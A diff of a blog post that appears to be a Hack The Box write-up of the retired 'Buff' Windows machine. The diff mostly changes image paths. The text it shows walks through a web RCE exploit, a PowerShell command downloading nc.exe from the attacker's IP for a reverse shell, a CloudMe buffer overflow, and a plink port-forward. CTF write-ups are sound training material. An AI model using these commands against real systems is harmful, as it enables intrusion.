@@ -16,7 +16,7 @@ tags:
 
 ## Intro
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_intro.png)
+![](/assets/posts/htb_buff/buff_intro.png)
 
 The following post will describe how I hacked the previously retired Buff Box. However, I am not an experienced Pentester, therefore take everything I say with a grain of salt. Now let’s have some fun with this nice Windows Box.
 
@@ -24,32 +24,32 @@ The following post will describe how I hacked the previously retired Buff Box. H
 
 First things first, we need to add the IP to /etc/hosts.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_hosts.png)
+![](/assets/posts/htb_buff/buff_hosts.png)
 
 ## Recon
 
 As usual, we start by enumerating our target using [nmap](https://nmap.org/). This allows us to identify potential attack vectors.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nmap.png)
+![](/assets/posts/htb_buff/buff_nmap.png)
 
 We can already confirm that the box uses a Microsoft Windows operating system and runs an [Apache webserver](https://httpd.apache.org/).  
 Using an ordinary browser, we are able to view the webpages content. There is not a lot that can be done, but the “Contact” menu at least allows us to identify that the site was build using “Gym Management Software”. When you introduce google with this search term, you already get a lot of vulnerabilities, so that sounds like a good starting point for us.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webpage.png)
+![](/assets/posts/htb_buff/buff_webpage.png)
 
 ## Exploit
 
 Exploit-db has this nice unauthenticated [RCE for Gym Management System 1.0](https://www.exploit-db.com/exploits/48506). After verification of the exploit code (we never run any code we do not understand), we can safely use it to get an initial foothold into the target system.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit.png)
+![](/assets/posts/htb_buff/buff_webexploit.png)
 
 That worked quite well. We are presented with a webshell and the user we have access too seems to be named “shaun”.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit_whoami.png)
+![](/assets/posts/htb_buff/buff_webexploit_whoami.png)
 
 Even if the webshell is very limited and does not allow us to change directories, we are still able to access the user.txt file from our current location in order to get the first flag.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit_user_flag.png)
+![](/assets/posts/htb_buff/buff_webexploit_user_flag.png)
 
 ## Getting Root
 
@@ -59,29 +59,29 @@ In order to start our privilege escalation operation, we really need a something
 powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.202:8000/nc.exe','nc3.exe')
 ```
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_upload_nc.png)
+![](/assets/posts/htb_buff/buff_upload_nc.png)
 
 In order for that to work, we have to start a local listener on our attacker machine.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nc_reverse_shell2.png)
+![](/assets/posts/htb_buff/buff_nc_reverse_shell2.png)
 
 And finally connect to the local listener from your target machine. The remote shell is working and we do not use the limited webshell any longer.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nc_reverse_shell.png)
+![](/assets/posts/htb_buff/buff_nc_reverse_shell.png)
 
 In order to find a local vulnerability to expoit, I required help from Mr.Google. However, this is what I ended up doing:
 
 Netstat for TCL and ports only listening on localhost are 3306 (MySQL) and 8888 which seems to be connected to service running by a CloudMe.exe.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_netstat.png)
+![](/assets/posts/htb_buff/buff_netstat.png)
 
 We can find the binary in the “shaun’s” Download directory.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_cloudme.png)
+![](/assets/posts/htb_buff/buff_cloudme.png)
 
 Exploit-db provides exploits for multiple versions, however it seems like the suffix indicates that it is version 1.11.2.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_exploit_db.png)
+![](/assets/posts/htb_buff/buff_exploit_db.png)
 
 I went with the simplest one – [CloudMe 1.11.2 – Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/48389). We can see that the code executes “calc.exe” as a Proof of Concept. In our case, we need to modify it to get a shell with the processes privileges. Therefore let’s use [msfvenom ](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)to generate an alternative payload that spawns a remote shell.
 
@@ -163,7 +163,7 @@ This is the approach that finally worked for me.
 
 Change the default ssh port in “/etc/ssh/sshd\_config” to an alternative one. I used the port “1234”.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding.png)
+![](/assets/posts/htb_buff/buff_remote_port_forwarding.png)
 
 Next, restart the service, in order for the changes to take effect.
 
@@ -177,11 +177,11 @@ On the target machine, start the plink application as follows in order to forwar
 plink3.exe -l kali -pw kali 10.10.14.202 -R 8888:127.0.0.1:8888 -P 1234
 ```
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding2.png)
+![](/assets/posts/htb_buff/buff_remote_port_forwarding2.png)
 
 We can verify that port forwarding is now working, when we check our local sshd ports.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding3.png)
+![](/assets/posts/htb_buff/buff_remote_port_forwarding3.png)
 
 When we ran the exploit locally, however, frustration is high, no remote shell… But why?
 
@@ -189,6 +189,6 @@ When we ran the exploit locally, however, frustration is high, no remote shell�
 
 After resetting the machine, the exploit worked and we are able to access root.txt.
 
-![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_root_flag.png)
+![](/assets/posts/htb_buff/buff_root_flag.png)
 
 Getting user was fun and I really enjoyed it, however, getting root was not that funny. Both pitfalls cost quite a lot of time to figure out and were not really part of the challenge. Nevertheless, another machine on the list. Bye!
